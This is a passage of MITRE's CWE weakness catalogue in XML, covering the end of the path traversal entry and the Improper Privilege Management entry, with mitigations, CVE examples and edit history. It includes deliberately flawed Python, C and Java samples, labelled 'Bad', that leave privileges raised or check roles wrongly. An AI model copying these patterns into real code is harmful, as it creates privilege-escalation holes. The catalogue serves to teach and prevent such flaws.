            <Related_Attack_Pattern CAPEC_ID="126"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 11, &#34;Directory Traversal and Using Parent Paths (..)&#34; Page 370"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-185"/>
            <Reference External_Reference_ID="REF-186"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Filenames and Paths&#34;, Page 503"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-22"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">Pathname equivalence can be regarded as a type of canonicalization error.</Note>
            <Note Type="Relationship">Some pathname equivalence issues are not directly related to directory traversal, rather are used to bypass security-relevant checks for whether a file/directory can be accessed by the attacker (e.g. a trailing "/" on a filename could bypass access rules that don't expect a trailing /, causing a server to provide the file when it normally would not).</Note>
            <Note Type="Terminology">
               <xhtml:p>Like other weaknesses, terminology is often based on the types of manipulations used, instead of the underlying weaknesses. Some people use "directory traversal" only to refer to the injection of ".." and equivalent sequences whose specific meaning is to traverse directories.</xhtml:p>
               <xhtml:p>Other variants like "absolute pathname" and "drive letter" have the *effect* of directory traversal, but some people may not call it such, since it doesn't involve ".." or equivalent.</xhtml:p>
            </Note>
            <Note Type="Research Gap">Many variants of path traversal attacks are probably under-studied with respect to root cause. CWE-790 and CWE-182 begin to cover part of this gap.</Note>
            <Note Type="Research Gap">
               <xhtml:p>Incomplete diagnosis or reporting of vulnerabilities can make it difficult to know which variant is affected. For example, a researcher might say that "..\" is vulnerable, but not test "../" which may also be vulnerable.</xhtml:p>
               <xhtml:p>Any combination of directory separators ("/", "\", etc.) and numbers of "." (e.g. "....") can produce unique variants; for example, the "//../" variant is not listed (CVE-2004-0325). See this entry's children and lower-level descendants.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes, Relationship_Notes, Relevant_Properties, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings, Terminology_Notes, Time_of_Introduction, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Relevant_Properties, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Detection_Factors</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Contribution Type="Feedback">
				  <Contribution_Name>Nick Johnston</Contribution_Name>
				  <Contribution_Date>2022-07-11</Contribution_Date>
				  <Contribution_Comment>Identified weakness in Perl demonstrative example</Contribution_Comment>
				</Contribution>
            <Previous_Entry_Name Date="2010-02-16">Path Traversal</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="269" Name="Improper Privilege Management" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-48">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Follow the principle of least privilege when assigning access rights to entities in a software system.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-49">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-126">
               <Intro_Text>This code temporarily raises the program's privileges to allow creation of a new user folder.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>def makeNewUserDir(username):<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if invalidUsername(username):<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>#avoid CWE-22 and CWE-78</xhtml:i>
                                 <xhtml:br/>print('Usernames cannot contain invalid characters')<xhtml:br/>return False</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>try:<xhtml:div style="margin-left:1em;">raisePrivileges()<xhtml:br/>os.mkdir('/home/' + username)<xhtml:br/>lowerPrivileges()</xhtml:div>
                           <xhtml:br/>except OSError:<xhtml:div style="margin-left:1em;">print('Unable to create new user directory for user:' + username)<xhtml:br/>return False</xhtml:div>
                           <xhtml:br/>return True</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-97">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>seteuid(0);<xhtml:br/>
                     <xhtml:i>/* do some stuff */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>seteuid(getuid());</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-142">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>AccessController.doPrivileged(new PrivilegedAction() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>public Object run() {<xhtml:div style="margin-left:1em;">
                                 <xhtml:i>// privileged code goes here, for example:</xhtml:i>
                                 <xhtml:br/>System.loadLibrary("awt");<xhtml:br/>return null;<xhtml:br/>
                                 <xhtml:i>// nothing to return</xhtml:i>
                                 <xhtml:br/>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-127">
               <Intro_Text>This code intends to allow only Administrators to print debug information about a system.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void printDebugInfo(User requestingUser){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">System.out.println(currentDebugState());<xhtml:br/>break;</xhtml:div>
                                    </xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of "GUEST". Someone with the role of "ADMIN" or "USER" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-128">
               <Intro_Text>This code allows someone with the role of "ADMIN" or "OPERATOR" to reset a user's password. The role of "OPERATOR" is intended to have less privileges than an "ADMIN", but still be able to help users with small issues such as forgotten passwords.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public enum Roles {<xhtml:div style="margin-left:1em;">ADMIN,OPERATOR,USER,GUEST</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void resetPassword(User requestingUser, User user, String password ){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(isAuthenticated(requestingUser)){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>switch(requestingUser.role){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>case GUEST:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>case USER:<xhtml:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<xhtml:br/>break;</xhtml:div>
                                       <xhtml:br/>default:<xhtml:div style="margin-left:1em;">setPassword(user,password);<xhtml:br/>break;</xhtml:div>}</xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>else{<xhtml:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1555</Reference>
               <Description>Terminal privileges are not reset when a user logs out.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1555</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1514</Reference>
               <Description>Does not properly pass security context to child processes in certain cases, allows privilege escalation.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1514</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0128</Reference>
               <Description>Does not properly compute roles.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1193</Reference>
               <Description>untrusted user placed in unix "wheel" group</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1193</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2741</Reference>
               <Description>Product allows users to grant themselves certain rights that can be used to escalate privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2741</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2496</Reference>
               <Description>Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0274</Reference>
               <Description>Product mistakenly assigns a particular status to an entity, leading to increased privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0274</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4217</Reference>
               <Description>FTP client program on a certain OS runs with setuid privileges and has a buffer overflow. Most clients do not need extra privileges, so an overflow is not a vulnerability for those clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4217</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5159</Reference>
               <Description>OS incorrectly installs a program with setuid privileges, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5159</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4638</Reference>
               <Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4638</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3931</Reference>
               <Description>Installation script installs some programs as setuid when they shouldn't be.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3931</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1981</Reference>
               <Description>Roles have access to dangerous procedures (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1981</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1671</Reference>
               <Description>Untrusted object/method gets access to clipboard (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1671</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0315</Reference>
               <Description>Traceroute program allows unprivileged users to modify source address of packet (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0315</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0506</Reference>
               <Description>User with capability can prevent setuid program from dropping privileges (Unsafe privileged actions).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0506</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Privilege Management Error</Entry_Name>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 2-4</Entry_ID>
			  <Entry_Name>Req SP.03.08 BR</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-2</Entry_ID>
			  <Entry_Name>Req CR 3.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
			  <Entry_Name>Req SR 1.2</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
			  <Entry_Name>Req SR 2.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SD-3</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SD-4</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SI-1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
			  <Entry_Name>Req CR 1.1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
			  <Entry_Name>Req CR 2.1</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="122"/>
            <Related_Attack_Pattern CAPEC_ID="233"/>
            <Related_Attack_Pattern CAPEC_ID="58"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 16: Executing Code With Too Much Privilege.&#34; Page 243"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Dropping Privileges Permanently&#34;, Page 479"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-269 is commonly misused. It can be conflated with "privilege escalation," which is a technical impact that is listed in many low-information vulnerability reports [REF-1287]. It is not useful for trend analysis.</Rationale>
            <Comments>If an error or mistake allows privilege escalation, then use the CWE ID for that mistake. Avoid using CWE-269 when only phrases such as "privilege escalation" or "gain privileges" are available, as these indicate technical impact of the vulnerability - not the root cause weakness. If the root cause seems to be directly related to privileges, then examine the children of CWE-269 for additional hints, such as Execution with Unnecessary Privileges (CWE-250) or Incorrect Privilege Assignment (CWE-266).</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>CWE Team</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>Moved this entry higher up in the Research view.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
